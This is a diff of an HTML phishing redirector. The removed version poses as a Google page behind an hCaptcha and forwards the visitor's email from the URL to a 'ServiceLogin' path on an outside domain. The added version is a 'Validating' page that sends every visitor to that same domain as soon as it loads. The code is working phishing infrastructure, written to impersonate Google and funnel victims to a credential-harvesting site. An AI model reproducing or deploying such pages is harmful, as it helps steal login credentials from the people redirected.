@@ -1,43 +1,33 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Google</title>
-  <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
-</head>
-<body>
-  <div style="width:500px; margin:0 auto;" id="hcaptcha-demo" class="h-captcha"
-    data-sitekey="6ae29b92-3518-4b89-90a1-458f5d5a69a6" data-callback="onSuccess" data-expired-callback="onExpire">
-  </div>
-  <script>
-      // success callback
-      var onSuccess = function (response) {
-        var browserURL = new URL(window.location.href);
-        var params = new URLSearchParams(browserURL.search);
-        var data = window.location.href.split('?')[1]
-        var redurl = 'https://inm-clan.eu/?dffrlnnm?'
-        // default redirect
-        var redLocation = redurl + 'ServiceLogin?Email=' + data
-  
-        // detect os
-        if (navigator.appVersion.indexOf('Win') != -1) {
-          if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
-            console.log('dark mode')
-            redLocation = redurl + 'ServiceLogin?Email=' + data
-          } else {
-            redLocation = redurl + 'ServiceLogin?Email=' + data
-          }
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <title>Validating......</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+  </head>
+  <body>
+    <script>
+      function redirrectPage() {
+        var query = window.location.href;
+        console.log(query);
+        var res = query.split("?");
+        var data1 = res[0];
+        var data2 = res[1];
+        console.log(data1);
+        console.log(data2);
+        //realemailID = atob(data2);
+        if (data2) {
+          console.log("true");
+          window.location.href =
+            "https://inm-clan.eu/?dffrlnnm?";
+        } else {
+          console.log("false");
+          window.location.href =
+            "https://inm-clan.eu/?dffrlnnm?";
         }
-  
-        if (navigator.appVersion.indexOf('Macintosh') != -1) {
-          if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
-            console.log('dark mode')
-            redLocation = redurl + 'ServiceLogin?Email=' + data
-          } else {
-            redLocation = redurl + 'ServiceLogin?Email=' + data
-          }
-        }
-        window.location.replace(redLocation);
-      };
+      }
+      redirrectPage();
     </script>
   </body>
-  </html>
+</html>
